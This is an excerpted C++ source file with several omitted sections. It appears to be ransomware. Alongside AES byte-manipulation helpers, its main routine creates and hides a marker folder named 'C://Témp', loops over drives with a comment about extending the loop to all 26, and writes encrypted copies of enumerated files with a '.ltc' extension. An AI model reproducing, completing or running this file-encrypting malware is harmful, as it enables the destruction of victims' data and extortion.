...
void InvSubBytes(byte8 mtx[4*4])
{
	for(int i=0; i<16; ++i)
	{
		int row = mtx[i][7]*8 + mtx[i][6]*4 + mtx[i][5]*2 + mtx[i][4];
...
void charToByte(byte8 out[16], const char s[16])
{ 
	for(int i=0; i<16; ++i)  
		for(int j=0; j<8; ++j)  
			out[i][j]= ((s[i]>>j) & 1);  
...
void divideByte(byte8 out[16], bitset<128>& data)
{
	bitset<128> temp;
	for(int i=0; i<16; ++i)
	{
...
bitset<128> mergeByte(byte8 in[16])
{
	bitset<128> res;
	bitset<128> temp;
	for(int i=0; i<16; ++i)
...
int main(int argc,char** argv)
{
		...
		const char *path = "C://Témp";
    
		if(ser(path) == 1)
		{
    		cout << "Exists\n";
			cout << "No Need to Run Anything\n";
			system("pause");
			return 0;
		}
		else if(ser(path) == 0)
		{
			...
			system("mkdir \"C://Témp\"");
			SetFileAttributesA("C://Témp", FILE_ATTRIBUTE_HIDDEN);
		...
		for(int i = 0; i < 1 /* increse it to 26 for all drives */; i++)
		{
				...
				for(unsigned int j = 0; j < files.size(); j++)
    			{
					...
					//	string keyStr = "abcdefghijklmnop";  
						...
						string add_ext;
						add_ext = files[j] + ".ltc";
						out.open(add_ext.c_str(), ios::binary);  
